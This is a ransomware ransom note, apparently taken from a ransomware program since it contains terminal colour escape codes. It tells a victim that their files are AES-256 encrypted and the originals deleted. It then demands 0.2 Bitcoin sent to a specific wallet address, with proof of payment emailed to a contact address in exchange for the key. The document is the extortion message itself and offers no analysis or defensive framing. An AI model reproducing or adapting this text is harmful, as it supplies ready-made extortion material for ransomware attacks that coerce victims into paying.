Your personal documents, photos, and other files on this device are encrypted using AES-256 algorithm.
The original files have been completely deleted and will only be recovered by following the steps described below.

1. To obtain the key which will decrypt files,you need to pay 0.2 Bitcoin from this wallet address:
    >> \033[93m1MCnevjk72Tuf7vsem3VZL8Qrvav2WsYjx\033[0m <<

2. After the payment is completed, contact us to \033[96mdecrypt@gmail.com\033[0m and send us the Transaction ID or your payment screenshot, and we will give you the key.
